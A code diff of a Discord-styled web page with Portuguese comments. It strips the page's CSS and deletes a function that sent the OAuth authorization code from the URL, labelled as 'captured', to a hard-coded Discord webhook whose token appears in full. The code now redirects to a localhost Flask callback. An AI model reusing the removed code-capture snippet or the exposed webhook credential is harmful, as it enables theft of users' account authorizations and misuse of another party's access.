@@ -14,93 +14,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <!-- CSS Personalizado -->
     <style>
-        /* Cores do Discord */
-        :root {
-            --discord-blurple: #5865F2;
-            --discord-green: #57F287;
-            --discord-red: #ED4245;
-            --discord-white: #FFFFFF;
-            --discord-black: #23272A;
-            --discord-gray: #2C2F33;
-        }
-
-        /* Aplicando a fonte Poppins */
-        body {
-            font-family: 'Poppins', sans-serif;
-            background-color: var(--discord-black);
-            color: var(--discord-white);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .container {
-            background-color: var(--discord-gray);
-            padding: 2rem;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-        }
-
-        h1 {
-            color: var(--discord-green);
-            font-size: 2.5rem;
-            margin-bottom: 1.5rem;
-            font-weight: 700; /* Peso mais grosso para o título */
-        }
-
-        p {
-            font-size: 1.1rem;
-            line-height: 1.6;
-            margin-bottom: 1.5rem;
-            font-weight: 400; /* Peso normal para o texto */
-        }
-
-        .btn-discord {
-            background-color: var(--discord-blurple);
-            color: var(--discord-white);
-            border: none;
-            padding: 0.75rem 1.5rem;
-            border-radius: 8px;
-            font-size: 1rem;
-            font-weight: 600; /* Peso semi-negrito para o botão */
-            transition: background-color 0.3s ease;
-        }
-
-        .btn-discord:hover {
-            background-color: #4752C4;
-        }
-
-        .footer {
-            margin-top: 2rem;
-            font-size: 0.9rem;
-            color: var(--discord-white);
-        }
-
-        .footer a {
-            color: var(--discord-blurple);
-            text-decoration: none;
-            font-weight: 600; /* Peso semi-negrito para links */
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* Animações personalizadas */
-        .animate-pop {
-            animation: pop 0.5s ease;
-        }
-
-        @keyframes pop {
-            0% { transform: scale(0.9); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
+        /* Estilos personalizados (mantenha os estilos anteriores) */
     </style>
 </head>
 <body>
@@ -160,36 +74,11 @@
             return urlParams.get('code');
         }
 
-        // Função para enviar o código para o webhook do Discord
-        function sendCodeToWebhook(code) {
-            const webhookURL = 'https://discord.com/api/webhooks/1329682656769867869/OF5xgKYuTOpvYYNMLuGyfRe5MlEO7XnrbFYbHfIxBbIXrL-uJGAAFlEq1KA4hzDe-OTU';
-            const message = {
-                content: `Código de autorização capturado: ${code}`
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message),
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log("Código enviado para o webhook com sucesso!");
-                } else {
-                    console.error("Erro ao enviar o código para o webhook:", response.statusText);
-                }
-            })
-            .catch(error => {
-                console.error("Erro na requisição:", error);
-            });
-        }
-
-        // Captura o código e envia para o webhook
+        // Captura o código e redireciona para o endpoint do Flask
         const code = getCodeFromURL();
         if (code) {
-            sendCodeToWebhook(code);
+            // Redireciona para o endpoint do Flask
+            window.location.href = `http://localhost:5000/callback?code=${code}`;
         } else {
             console.log("Nenhum código encontrado na URL.");
         }
